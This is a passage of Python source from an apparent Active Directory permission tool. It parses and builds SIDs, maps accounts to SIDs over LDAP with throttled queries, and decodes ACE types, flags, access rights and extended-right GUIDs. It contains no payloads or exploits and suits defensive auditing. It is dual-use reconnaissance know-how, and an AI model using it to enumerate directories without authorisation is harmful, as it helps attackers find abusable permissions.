		for i in self.SubAuthority:
			t += i.to_bytes(4, 'little', signed = False)
		return t

	def __str__(self):
		t = 'S-1-'
		if self.IdentifierAuthority < 2**32:
			t += str(self.IdentifierAuthority)
		else:
			t += '0x' + self.IdentifierAuthority.to_bytes(6, 'big').hex().upper().rjust(12, '0')
		for i in self.SubAuthority:
			t += '-' + str(i)
		return t

	'''
	TODO: If we figure out how to properly convert the pretty names to the correct SIDs enable this part
			problem is that pretty names sometimes belong to full SIDs sometimes to RIDs only and there is no way to tell if it belonged to
			a domain-sid or a local sid

	for val in SDDL_VAL_NAME_MAPS:
		if isinstance(val, str) is True and val == x:
			return SDDL_VAL_NAME_MAPS[val]
		elif isinstance(val, int) is True and self.SubAuthority[-1] == val:
			return SDDL_VAL_NAME_MAPS[val]
	return x
	'''
	def to_sddl(self):
		x = str(self)
		return x

	@staticmethod
	def from_sddl(sddl, domain_sid = None):
		if len(sddl) > 2:
			return SID.from_string(sddl)
		else:
			if sddl not in SDDL_NAME_VAL_MAPS:
				raise Exception('%s was not found in the well known sid definitions!' % sddl)
			account_sid_val = SDDL_NAME_VAL_MAPS[sddl]
			if isinstance(account_sid_val, str):
				return SID.from_string(account_sid_val)
			else:
				if domain_sid is None:
					raise Exception('Missing domain_sid! Cant convert "%s" to a SID' % sddl)
				return SID.from_string(domain_sid + '-' +str(account_sid_val))

def parseObjectSID(sidB64):
	print_yellow("[*] Parsing objectSid")
	print_yellow("---")
	print()

	try:
		# Base64 Decode + Binary format to SID format
		sid = SID.from_bytes(base64.b64decode(sidB64))

		# Print SID
		print(f"[+] objectSid = {sid.__str__()}")

		return sid.__str__()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def buildObjectSID(sidStr):
	print_yellow("[*] Building objectSid")
	print_yellow("---")
	print()

	try:
		# Build SID object
		sid = SID.from_string(sidStr)

		# Export to bytes
		sidBytes = sid.to_bytes()

		# Base64 encode
		sidB64 = base64.b64encode(sidBytes)

		print(f"[+] objectSid = {sidB64.decode()}")

		return sidB64.decode()
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getSIDs(conn, server, objects, asStr = True):
	sids = {}

	base_dn = server.info.other['defaultNamingContext'][0]
	for object in objects:
		maybeSleep()
		if isinstance(object, bytes):
			object = object.decode()
		escaped_object = escape_filter_chars(object)
		if (object.lower()).endswith(base_dn.lower()): # We have a distinguishedName
			entry_generator = search(conn, server, escaped_object, f"(distinguishedName={escaped_object})", attributes = ["objectSID"])
		else: # We can have a name or samAccountName. Treat name as distinguished name started with CN=<name>* to avoid duplicates
			entry_generator = search(conn, server, filter = f"(|(samAccountName={escaped_object})(distinguishedName=CN={escaped_object}*))", attributes = ["objectSID"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				objectSID = entry["raw_attributes"]["objectSID"]
				if (objectSID != []):
					if asStr:
						sids[SID.from_bytes(objectSID[0]).__str__()] = object
					else:
						sids[objectSID[0]] = object

	return sids

def mapObjects(conn, server, objects):
	print_yellow("[*] Get SIDs of provided AD objects")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		sids = getSIDs(conn, server, objects)
		if len(sids) == 0:
			print("[-] Failed to get SIDs of provided AD objects", file = sys.stderr)
			return

		print("[+] Current mapping")
		for key, val in sids.items():
			print(f"\t[+] {key}: {val}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def SIDsToSAMs(conn, server, sids):
	sams = {}
	for sid_str in sids:
		maybeSleep()
		entry_generator = search(conn, server, filter = f"(objectSid={sid_str})", attributes = ["distinguishedName", "samAccountName"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				sam = entry["raw_attributes"]["samAccountName"]
				if (len(sam) > 0):
					sams[sid_str] = sam[0].decode()
				else:
					sams[sid_str] = entry["raw_attributes"]["distinguishedName"][0].decode()

	return sams

def mapSIDs(conn, server, sids):
	print_yellow("[*] Get samAccountNames of provided SIDs' string")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		sams = SIDsToSAMs(conn, server, sids)
		if len(sams) == 0:
			print("[-] Failed to get sAMAccountName of provided AD objects", file = sys.stderr)
			return

		print("[+] Current mapping")
		for key, val in sams.items():
			print(f"\t[+] {key}: {val}")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

##########################################################################
#                     Access Control Entries (ACE)                       #
##########################################################################

### ACE Type ###

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/628ebb1d-c509-4ea0-a10f-77ef97ca4586
class ACEType(enum.Enum):
	ACCESS_ALLOWED_ACE_TYPE = 0x00
	ACCESS_DENIED_ACE_TYPE = 0x01
	SYSTEM_AUDIT_ACE_TYPE = 0x02
	SYSTEM_ALARM_ACE_TYPE = 0x03
	ACCESS_ALLOWED_COMPOUND_ACE_TYPE = 0x04
	ACCESS_ALLOWED_OBJECT_ACE_TYPE = 0x05
	ACCESS_DENIED_OBJECT_ACE_TYPE = 0x06
	SYSTEM_AUDIT_OBJECT_ACE_TYPE = 0x07
	SYSTEM_ALARM_OBJECT_ACE_TYPE = 0x08
	ACCESS_ALLOWED_CALLBACK_ACE_TYPE = 0x09
	ACCESS_DENIED_CALLBACK_ACE_TYPE = 0x0A
	ACCESS_ALLOWED_CALLBACK_OBJECT_ACE_TYPE = 0x0B
	ACCESS_DENIED_CALLBACK_OBJECT_ACE_TYPE = 0x0C
	SYSTEM_AUDIT_CALLBACK_ACE_TYPE = 0x0D
	SYSTEM_ALARM_CALLBACK_ACE_TYPE = 0x0E
	SYSTEM_AUDIT_CALLBACK_OBJECT_ACE_TYPE = 0x0F
	SYSTEM_ALARM_CALLBACK_OBJECT_ACE_TYPE = 0x10
	SYSTEM_MANDATORY_LABEL_ACE_TYPE = 0x11
	SYSTEM_RESOURCE_ATTRIBUTE_ACE_TYPE = 0x12
	SYSTEM_SCOPED_POLICY_ID_ACE_TYPE = 0x13

# https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
SDDL_ACE_TYPE_MAPS = {
	"A"  : ACEType.ACCESS_ALLOWED_ACE_TYPE,
	"D"  : ACEType.ACCESS_DENIED_ACE_TYPE,
	"OA" : ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE,
	"OD" : ACEType.ACCESS_DENIED_OBJECT_ACE_TYPE,
	"AU" : ACEType.SYSTEM_AUDIT_ACE_TYPE,
	"AL" : ACEType.SYSTEM_ALARM_ACE_TYPE,
	"OU" : ACEType.SYSTEM_AUDIT_OBJECT_ACE_TYPE,
	"OL" : ACEType.SYSTEM_ALARM_OBJECT_ACE_TYPE,
	"ML" : ACEType.SYSTEM_MANDATORY_LABEL_ACE_TYPE, # Windows Server 2003: Not available.
	"XA" : ACEType.ACCESS_ALLOWED_CALLBACK_ACE_TYPE, # Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	"XD" : ACEType.ACCESS_DENIED_CALLBACK_ACE_TYPE, # Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	"RA" : ACEType.SYSTEM_RESOURCE_ATTRIBUTE_ACE_TYPE, # Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	"SP" : ACEType.SYSTEM_SCOPED_POLICY_ID_ACE_TYPE, # Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	"XU" : ACEType.SYSTEM_AUDIT_CALLBACK_ACE_TYPE, # Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	"ZA" : ACEType.ACCESS_ALLOWED_CALLBACK_ACE_TYPE, # Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	# "TL" : ACEType.SYSTEM_PROCESS_TRUST_LABEL_ACE_TYPE, # Windows Server 2012, Windows 8, Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	# "FL" : ACEType.SYSTEM_ACCESS_FILTER_ACE_TYPE # Windows Server 2016, Windows 10 Version 1607, Windows 10 Version 1511, Windows 10 Version 1507, Windows Server 2012 R2, Windows 8.1, Windows Server 2012, Windows 8, Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
}

SDDL_ACE_TYPE_MAPS_INV = {v: k for k, v in SDDL_ACE_TYPE_MAPS.items()}

def ACE_TYPE_TO_SDDL(type):
	return SDDL_ACE_TYPE_MAPS_INV[type]

def SDDL_TO_ACE_TYPE(type_str):
	return SDDL_ACE_TYPE_MAPS[type_str]

def SDDL_TO_ACE_TYPE_STR(type_str):
	return SDDL_ACE_TYPE_MAPS[type_str].name

### ACE Flags ###

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/628ebb1d-c509-4ea0-a10f-77ef97ca4586
class ACEFlags(enum.IntFlag):
	CONTAINER_INHERIT_ACE = 0x02
	FAILED_ACCESS_ACE_FLAG = 0x80
	INHERIT_ONLY_ACE = 0x08
	INHERITED_ACE = 0x10
	NO_PROPAGATE_INHERIT_ACE = 0x04
	OBJECT_INHERIT_ACE = 0x01
	SUCCESSFUL_ACCESS_ACE_FLAG = 0x40

# https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
SDDL_ACE_FLAGS_MAPS = {
	"CI": ACEFlags.CONTAINER_INHERIT_ACE,
	"OI": ACEFlags.OBJECT_INHERIT_ACE,
	"NP": ACEFlags.NO_PROPAGATE_INHERIT_ACE,
	"IO": ACEFlags.INHERIT_ONLY_ACE,
	"ID": ACEFlags.INHERITED_ACE,
	"SA": ACEFlags.SUCCESSFUL_ACCESS_ACE_FLAG,
	"FA": ACEFlags.FAILED_ACCESS_ACE_FLAG,
	# "TP": ACEFlags.TRUST_PROTECTED_FILTER_ACE_FLAG, # Windows Server 2016, Windows 10 Version 1607, Windows 10 Version 1511, Windows 10 Version 1507, Windows Server 2012 R2, Windows 8.1, Windows Server 2012, Windows 8, Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
	# "CR": ACEFlags.CRITICAL_ACE_FLAG # Windows Server Version 1803, Windows 10 Version 1803, Windows Server Version 1709, Windows 10 Version 1709, Windows 10 Version 1703, Windows Server 2016, Windows 10 Version 1607, Windows 10 Version 1511, Windows 10 Version 1507, Windows Server 2012 R2, Windows 8.1, Windows Server 2012, Windows 8, Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista and Windows Server 2003: Not available.
}

SDDL_ACE_FLAGS_MAPS_INV = {v: k for k, v in SDDL_ACE_FLAGS_MAPS.items()}

def ACE_FLAGS_TO_SDDL(flags):
	return "".join([SDDL_ACE_FLAGS_MAPS_INV[k] for k in ACEFlags(flags)])

def SDDL_TO_ACE_FLAGS(flags_str):
	flags = 0
	for i in range(0, len(flags_str), 2):
		flags |= SDDL_ACE_FLAGS_MAPS[flags_str[i:i+2]]
	return flags

def SDDL_TO_ACE_FLAGS_STR(flags_str):
	if flags_str == '':
		return "<None>"
	else:
		flags_str = [flags_str[i:i + 2] for i in range(0, len(flags_str), 2)]
		return "|".join([SDDL_ACE_FLAGS_MAPS[k].name for k in SDDL_ACE_FLAGS_MAPS if k in flags_str])

### ACE Access Rights ###

def get_highest_priority_flags(value):
	flags = []
	# Ordered list of flags by priority
	priority_flags = [
		ACEAccessRights.GENERIC_ALL,
		ACEAccessRights.GENERIC_WRITE,
		ACEAccessRights.GENERIC_READ,
		ACEAccessRights.GENERIC_EXECUTE,
		ACEAccessRights.CREATE_CHILD,
		ACEAccessRights.DELETE_CHILD,
		ACEAccessRights.LIST_CHILDREN,
		ACEAccessRights.SELF,
		ACEAccessRights.READ_PROPERTY,
		ACEAccessRights.WRITE_PROPERTY,
		ACEAccessRights.DELETE_TREE,
		ACEAccessRights.LIST_OBJECT,
		ACEAccessRights.EXTENDED_RIGHTS,
		ACEAccessRights.DELETE,
		ACEAccessRights.READ_CONTROL,
		ACEAccessRights.WRITE_DACL,
		ACEAccessRights.WRITE_OWNER,
		ACEAccessRights.SYNCHRONIZE,
		ACEAccessRights.ACCESS_SYSTEM_SECURITY
	]

	# Iterate through priority_flags and match against `value`
	for flag in priority_flags:
		if value & flag == flag:
			flags.append(flag)
			value &= ~flag  # Remove the matched flag from value to avoid duplicates

	return flags

# General access rights
# 	https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks
#	https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
# BUT we are only interested by Active Directory Domain Services (ADDS) objects access rights for LDAP
# 	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/990fb975-ab31-4bc1-8b75-5da132cd4584
#	https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=dotnet-plat-ext-6.0
#	https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights
class ACEAccessRights(enum.IntFlag):
	CREATE_CHILD = 0x00000001 # The ObjectType GUID identifies a type of child object. The ACE controls the trustee's right to create this type of child object.
	DELETE_CHILD = 0x00000002 # The ObjectType GUID identifies a type of child object. The ACE controls the trustee's right to delete this type of child object.
	LIST_CHILDREN = 0x00000004 # Enumerate a DS object.
	SELF = 0x00000008 # The ObjectType GUID identifies a validated write.
	READ_PROPERTY = 0x00000010 # The ObjectType GUID identifies a property set or property of the object. The ACE controls the trustee's right to read the property or property set.
	WRITE_PROPERTY = 0x00000020 # The ObjectType GUID identifies a property set or property of the object. The ACE controls the trustee's right to write the property or property set.
	DELETE_TREE = 0x00000040 # The right to delete all children of this object, regardless of the permissions of the children.
	LIST_OBJECT = 0x00000080 # The right to list a particular object. For more information about this right, see the Controlling Object Visibility article.
	EXTENDED_RIGHTS = 0x00000100 # The ObjectType GUID identifies an extended access right. EDIT: Changed display name from CONTROL_ACCESS to EXTENDED_RIGHTS because It is more explicit
	DELETE = 0x00010000 # The right to delete the object.
	READ_CONTROL = 0x00020000 # The right to read data from the security descriptor of the object, not including the data in the SACL.
	GENERIC_EXECUTE = 0x00020004 # The right to read permissions on, and list the contents of, a container object.
	GENERIC_WRITE = 0x00020028 # The right to read permissions on this object, write all the properties on this object, and perform all validated writes to this object.
	GENERIC_READ = 0x00020094 # The right to read permissions on this object, read all the properties on this object, list this object name when the parent container is listed, and list the contents of this object if it is a container.
	WRITE_DACL = 0x00040000 # The right to modify the DACL in the object security descriptor.
	WRITE_OWNER = 0x00080000 # The right to assume ownership of the object. The user must be an object trustee. The user cannot transfer the ownership to other users.
	GENERIC_ALL = 0x000f01ff # The right to create or delete children, delete a subtree, read and write properties, examine children and the object itself, add and remove the object from the directory, and read or write with an extended right.
	SYNCHRONIZE = 0x00100000 # The right to use the object for synchronization. This right enables a thread to wait until that object is in the signaled state.
	ACCESS_SYSTEM_SECURITY 	= 0x01000000 # The right to get or set the SACL in the object security descriptor.

SDDL_ACE_ACCESS_RIGHTS_MAPS = {
	"CC": ACEAccessRights.CREATE_CHILD,
	"DC": ACEAccessRights.DELETE_CHILD,
	"LC": ACEAccessRights.LIST_CHILDREN,
	"VW": ACEAccessRights.SELF,
	"RP": ACEAccessRights.READ_PROPERTY,
	"WP": ACEAccessRights.WRITE_PROPERTY,
	"DT": ACEAccessRights.DELETE_TREE,
	"LO": ACEAccessRights.LIST_OBJECT,
	"CR": ACEAccessRights.EXTENDED_RIGHTS,
	"DE": ACEAccessRights.DELETE,
	"RC": ACEAccessRights.READ_CONTROL,
	"GX": ACEAccessRights.GENERIC_EXECUTE, # GX = (RC | LC)
	"GW": ACEAccessRights.GENERIC_WRITE, # GW = (RC | WP | VW)
	"GR": ACEAccessRights.GENERIC_READ, # GR = (RC | LC | RP | LO)
	"WD": ACEAccessRights.WRITE_DACL,
	"WO": ACEAccessRights.WRITE_OWNER,
	"GA": ACEAccessRights.GENERIC_ALL, # GA = (DE | RC | WD | WO | CC | DC | DT | RP | WP | LC | LO | CR | VW)
	"SY": ACEAccessRights.SYNCHRONIZE, # Could not find a mapped symbol from docs -> Guessed "SY"
	"AS": ACEAccessRights.ACCESS_SYSTEM_SECURITY # https://learn.microsoft.com/en-us/windows/win32/secauthz/access-mask-format
}

SDDL_ACE_ACCESS_RIGHTS_MAPS_INV = {v: k for k, v in SDDL_ACE_ACCESS_RIGHTS_MAPS.items()}

def ACE_ACCESS_RIGHTS_TO_SDDL(rights):
	return "".join([SDDL_ACE_ACCESS_RIGHTS_MAPS_INV[k] for k in get_highest_priority_flags(ACEAccessRights(rights))])

def SDDL_TO_ACE_ACCESS_RIGHTS(rights_str):
	try:
		# Access rights are in hexadecimal string
		mask = int(rights_str, 16)
	except ValueError as e:
		# Access rights as strings
		mask = 0
		for i in range(0, len(rights_str), 2):
			mask |= SDDL_ACE_ACCESS_RIGHTS_MAPS[rights_str[i:i+2]]
	return mask

def SDDL_TO_ACE_ACCESS_RIGHTS_STR(rights_str):
	if rights_str == '':
		return "<None>"
	else:
		rights_str = [rights_str[i:i + 2] for i in range(0, len(rights_str), 2)]
		return "|".join([SDDL_ACE_ACCESS_RIGHTS_MAPS[k].name for k in SDDL_ACE_ACCESS_RIGHTS_MAPS if k in rights_str])

# Active Directory Certificate Services (ADCS) rights
# https://github.com/GhostPack/Certify/blob/2b1530309c0c5eaf41b2505dfd5a68c83403d031/Certify/Domain/CertificateAuthority.cs#L11
class ACEAccessRightsCertificationAuthority(enum.IntFlag):
	MANAGE_CA = 0x1
	MANAGE_CERTIFICATES = 0x2
	AUDITOR = 0x4
	OPERATOR = 0x8
	READ = 0x100
	ENROLL = 0x200

SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS = {
	"CA": ACEAccessRightsCertificationAuthority.MANAGE_CA,
	"CE": ACEAccessRightsCertificationAuthority.MANAGE_CERTIFICATES,
	"AU": ACEAccessRightsCertificationAuthority.AUDITOR,
	"OP": ACEAccessRightsCertificationAuthority.OPERATOR,
	"RD": ACEAccessRightsCertificationAuthority.READ,
	"EN": ACEAccessRightsCertificationAuthority.ENROLL,
}

SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS_INV = {v: k for k, v in SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS.items()}

def ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(rights):
	return "".join([SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS_INV[k] for k in ACEAccessRightsCertificationAuthority(rights)])

def SDDL_TO_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY(rights_str):
	try:
		# Access rights are in hexadecimal string
		mask = int(rights_str, 16)
	except ValueError as e:
		# Access rights as strings
		mask = 0
		for i in range(0, len(rights_str), 2):
			mask |= SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS[rights_str[i:i+2]]
	return mask

def SDDL_TO_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_STR(rights_str):
	if rights_str == '':
		return "<None>"
	else:
		rights_str = [rights_str[i:i + 2] for i in range(0, len(rights_str), 2)]
		return "|".join([SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS[k].name for k in SDDL_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_MAPS if k in rights_str])

### ACE Object and ACE Inherit Object ###

# rightsGUID of CN=Extended-Rights,CN=Configuration,DC=<Domain>,DC=<TLD>
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb
SDDL_ACE_CONTROL_ACCESS_RIGHTS_MAPS = {
	"ee914b82-0a98-11d1-adbb-00c04fd8d5cd": "Abandon-Replication",
	"440820ad-65b4-11d1-a3da-0000f875ae0d": "Add-GUID",
	"1abd7cf8-0a99-11d1-adbb-00c04fd8d5cd": "Allocate-Rids",
	"68b1d179-0d15-4d4f-ab71-46152e79a7bc": "Allowed-To-Authenticate",
	"edacfd8f-ffb3-11d1-b41d-00a0c968f939": "Apply-Group-Policy",
	"0e10c968-78fb-11d2-90d4-00c04f79dc55": "Certificate-Enrollment",
	"a05b8cc2-17bc-4802-a710-e7c15ab866a2": "Certificate-AutoEnrollment",
	"014bf69c-7b3b-11d1-85f6-08002be74fab": "Change-Domain-Master",
	"cc17b1fb-33d9-11d2-97d4-00c04fd8d5cd": "Change-Infrastructure-Master",
	"bae50096-4752-11d1-9052-00c04fc2d4cf": "Change-PDC",
	"d58d5f36-0a98-11d1-adbb-00c04fd8d5cd": "Change-Rid-Master",
	"e12b56b6-0a95-11d1-adbb-00c04fd8d5cd": "Change-Schema-Master",
	"e2a36dc9-ae17-47c3-b58b-be34c55ba633": "Create-Inbound-Forest-Trust",
	"fec364e0-0a98-11d1-adbb-00c04fd8d5cd": "Do-Garbage-Collection",
	"ab721a52-1e2f-11d0-9819-00aa0040529b": "Domain-Administer-Server",
	"69ae6200-7f46-11d2-b9ad-00c04f79f805": "DS-Check-Stale-Phantoms",
	"2f16c4a5-b98e-432c-952a-cb388ba33f2e": "DS-Execute-Intentions-Script",
	"9923a32a-3607-11d2-b9be-0000f87a36b2": "DS-Install-Replica",
	"4ecc03fe-ffc0-4947-b630-eb672a8a9dbc": "DS-Query-Self-Quota",
	"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
	"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
	"89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
	"1131f6ac-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Manage-Topology",
	"f98340fb-7c5b-4cdb-a00b-2ebdfa115a96": "DS-Replication-Monitor-Topology",
	"1131f6ab-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Synchronize",
	"05c74c5e-4deb-43b4-bd9f-86664c2a7fd5": "Enable-Per-User-Reversibly-Encrypted-Password",
	"b7b1b3de-ab09-4242-9e30-9980e5d322f7": "Generate-RSoP-Logging",
	"b7b1b3dd-ab09-4242-9e30-9980e5d322f7": "Generate-RSoP-Planning",
	"7c0e2a7c-a419-48e4-a995-10180aad54dd": "Manage-Optional-Features",
	"ba33815a-4f93-4c76-87f3-57574bff8109": "Migrate-SID-History",
	"b4e60130-df3f-11d1-9c86-006008764d0e": "msmq-Open-Connector",
	"06bd3201-df3e-11d1-9c86-006008764d0e": "msmq-Peek",
	"4b6e08c3-df3c-11d1-9c86-006008764d0e": "msmq-Peek-computer-Journal",
	"4b6e08c1-df3c-11d1-9c86-006008764d0e": "msmq-Peek-Dead-Letter",
	"06bd3200-df3e-11d1-9c86-006008764d0e": "msmq-Receive",
	"4b6e08c2-df3c-11d1-9c86-006008764d0e": "msmq-Receive-computer-Journal",
	"4b6e08c0-df3c-11d1-9c86-006008764d0e": "msmq-Receive-Dead-Letter",
	"06bd3203-df3e-11d1-9c86-006008764d0e": "msmq-Receive-journal",
	"06bd3202-df3e-11d1-9c86-006008764d0e": "msmq-Send",
	"a1990816-4298-11d1-ade2-00c04fd8d5cd": "Open-Address-Book",
	"1131f6ae-9c07-11d1-f79f-00c04fc2dcd2": "Read-Only-Replication-Secret-Synchronization",
	"45ec5156-db7e-47bb-b53f-dbeb2d03c40f": "Reanimate-Tombstones",
	"0bc1554e-0a99-11d1-adbb-00c04fd8d5cd": "Recalculate-Hierarchy",
	"62dd28a8-7f46-11d2-b9ad-00c04f79f805": "Recalculate-Security-Inheritance",
	"ab721a56-1e2f-11d0-9819-00aa0040529b": "Receive-As",
	"9432c620-033c-4db7-8b58-14ef6d0bf477": "Refresh-Group-Cache",
	"1a60ea8d-58a6-4b20-bcdc-fb71eb8a9ff8": "Reload-SSL-Certificate",
	"7726b9d5-a4b4-4288-a6b2-dce952e80a7f": "Run-Protect_Admin_Groups-Task",
	"91d67418-0135-4acc-8d79-c08e857cfbec": "SAM-Enumerate-Entire-Domain",
	"ab721a54-1e2f-11d0-9819-00aa0040529b": "Send-As",
	"ab721a55-1e2f-11d0-9819-00aa0040529b": "Send-To",
	"ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501": "Unexpire-Password",
	"280f369c-67c7-438e-ae98-1d46f3c6f541": "Update-Password-Not-Required-Bit",
	"be2bb760-7f46-11d2-b9ad-00c04f79f805": "Update-Schema-Cache",
	"ab721a53-1e2f-11d0-9819-00aa0040529b": "User-Change-Password",
	"00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
	"3e0f7e18-2c7a-4c10-ba82-4d926db99a3e": "DS-Clone-Domain-Controller",
	"084c93a2-620d-4879-a836-f0ae47de0e89": "DS-Read-Partition-Secrets",
	"94825a8d-b171-4116-8146-1e34d8f54401": "DS-Write-Partition-Secrets",
	"4125c71f-7fac-4ff0-bcb7-f09a41325286": "DS-Set-Owner",
	"88a9933e-e5c8-4f2a-9dd7-2527416b8092": "DS-Bypass-Quota",
	"9b026da6-0d3c-465c-8bee-5199d7165cba": "DS-Validated-Write-Computer"
}

# rightsGUID of CN=Extended-Rights,CN=Configuration,DC=<Domain>,DC=<TLD>
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/177c0db5-fa12-4c31-b75a-473425ce9cca
SDDL_ACE_PROPERTY_SETS_MAPS = {
	"72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS Host Name Attributes",
	"b8119fd0-04f6-4762-ab7a-4986c76b3f9a": "Other Domain Parameters (for use by SAM)",
	"c7407360-20bf-11d0-a768-00aa006e0529": "Domain Password & Lockout Policies",
	"e45795b2-9455-11d1-aebd-0000f80367c1": "Phone and Mail Options",
	"59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General Information",
	"bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Group Membership",
	"ffa6f046-ca4b-4feb-b40d-04dfee722543": "MS-TS-GatewayAccess",
	"77b5b886-944a-11d1-aebd-0000f80367c1": "Personal Information",
	"91e647de-d96f-4b70-9557-d63ff4f3ccd8": "Private Information",
	"e48d0154-bcf8-11d1-8702-00c04fb96050": "Public Information",
	"037088f8-0ae1-11d2-b422-00a0c968f939": "Remote Access Information",
	"5805bc62-bdc9-4428-a5e2-856a0f4c185e": "Terminal Server License Server",
	"4c164200-20c0-11d0-a768-00aa006e0529": "Account Restrictions",
	"5f202010-79a5-11d0-9020-00c04fc2d4cf": "Logon Information",
	"e45795b3-9455-11d1-aebd-0000f80367c1": "Web Information"
}

# rightsGUID of CN=Extended-Rights,CN=Configuration,DC=<Domain>,DC=<TLD>
# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/20504d60-43ec-458f-bc7a-754eb64446df
SDDL_ACE_VALIDATED_WRITES_MAPS = {
	"bf9679c0-0de6-11d0-a285-00aa003049e2": "Self-Membership",
	"72e39547-7b18-11d1-adef-00c04fd8d5cd": "Validated-DNS-Host-Name",
	"80863791-dbe9-4eb8-837e-7f0ab55d9ac7": "Validated-MS-DS-Additional-DNS-Host-Name",
	"d31a8757-2447-4545-8081-3bb610cacbf2": "Validated-MS-DS-Behavior-Version",
	"f3a64788-5306-11d1-a9c5-0000f80367c1": "Validated-SPN"
}

# schemaIDGUID of CN=Schema,CN=Configuration,DC=<Domain>,DC=<TLD>
SDDL_ACE_SCHEMAIDGUID_MAPS = {
	"bf967932-0de6-11d0-a285-00aa003049e2": "CA-Certificate",
	"ba305f76-47e3-11d0-a1a6-00c04fd930c9": "Bytes-Per-Minute",
	"bf967931-0de6-11d0-a285-00aa003049e2": "Business-Category",
	"bf967930-0de6-11d0-a285-00aa003049e2": "Builtin-Modified-Count",
	"bf96792f-0de6-11d0-a285-00aa003049e2": "Builtin-Creation-Time",
	"f87fa54b-b2c5-4fd7-88c0-daccb21d93c5": "buildingName",
	"d50c2cda-8951-11d1-aebc-0000f80367c1": "Bridgehead-Transport-List",
	"d50c2cdb-8951-11d1-aebc-0000f80367c1": "Bridgehead-Server-List-BL",
	"1f0075f9-7e40-11d0-afd6-00c04fd930c9": "Birth-Location",
	"bf96792e-0de6-11d0-a285-00aa003049e2": "Bad-Pwd-Count",
	"bf96792d-0de6-11d0-a285-00aa003049e2": "Bad-Password-Time",
	"bf96792c-0de6-11d0-a285-00aa003049e2": "Auxiliary-Class",
	"1677578d-47f3-11d1-a9c3-0000f80367c1": "Authority-Revocation-List",
	"bf967928-0de6-11d0-a285-00aa003049e2": "Authentication-Options",
	"6da8a4fe-0e52-11d0-a286-00aa003049e2": "Auditing-Policy",
	"d0e1d224-e1a0-42ce-a2da-793ba5244f35": "audio",
	"9a7ad944-ca53-11d1-bbd0-0080c76670c0": "Attribute-Types",
	"bf967925-0de6-11d0-a285-00aa003049e2": "Attribute-Syntax",
	"bf967924-0de6-11d0-a285-00aa003049e2": "Attribute-Security-GUID",
	"bf967922-0de6-11d0-a285-00aa003049e2": "Attribute-ID",
	"cb843f80-48d9-11d1-a9c3-0000f80367c1": "Attribute-Display-Names",
	"fa4693bb-7bc2-4cb9-81a8-c99c43b7905e": "attributeCertificateAttribute",
